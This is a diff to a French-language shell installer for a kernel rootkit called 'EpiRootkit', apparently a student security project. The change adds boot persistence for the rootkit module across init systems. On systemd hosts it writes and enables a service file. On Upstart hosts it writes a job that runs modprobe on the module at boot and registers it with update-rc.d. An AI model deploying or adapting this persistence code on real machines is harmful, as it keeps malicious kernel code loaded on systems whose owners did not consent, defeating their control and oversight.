@@ -77,9 +77,11 @@ cp epirootkit.ko "/lib/modules/$(uname -r)/extra/"
 print_message "Mise à jour des dépendances..."
 depmod -a
 
-# Créer le service systemd pour la persistance
-print_message "Configuration du service systemd..."
-cat > /etc/systemd/system/epirootkit.service << EOF
+# Créer le service systemd ou upstart pour la persistance
+print_message "Configuration de la persistance..."
+if command -v systemctl >/dev/null 2>&1; then
+    print_message "Systemd détecté, installation du service systemd..."
+    cat > /etc/systemd/system/epirootkit.service << EOF
 [Unit]
 Description=EpiRootkit Service
 After=network.target
@@ -92,12 +94,30 @@ RemainAfterExit=yes
 [Install]
 WantedBy=multi-user.target
 EOF
+    print_message "Activation du service..."
+    systemctl daemon-reload
+    systemctl enable epirootkit.service
+    systemctl start epirootkit.service
+elif [ -d /etc/init ]; then
+    print_message "Upstart détecté, installation du job Upstart..."
+    cat > /etc/init/epirootkit.conf << EOF
+# epirootkit - Upstart job
+start on runlevel [2345]
+stop on runlevel [!2345]
 
-# Activer et démarrer le service
-print_message "Activation du service..."
-systemctl daemon-reload
-systemctl enable epirootkit.service
-systemctl start epirootkit.service
+script
+    /sbin/modprobe epirootkit || true
+end script
+EOF
+    print_message "Activation du job Upstart..."
+    if ! initctl list | grep -q epirootkit; then
+        initctl reload-configuration
+    fi
+    service epirootkit start || initctl start epirootkit || true
+    update-rc.d epirootkit defaults || true
+else
+    print_warning "Aucun gestionnaire d'init compatible (systemd ou upstart) détecté. La persistance ne sera pas installée."
+fi
 
 # Vérifier si l'installation a réussi
 if ! lsmod | grep -q "epirootkit"; then
@@ -114,4 +134,4 @@ if ! lsmod | grep -q "epirootkit"; then
 fi
 
 print_message "EpiRootkit installé et activé avec succès"
-print_message "Sauvegarde créée dans : $BACKUP_PATH" 
+print_message "Sauvegarde créée dans : $BACKUP_PATH"
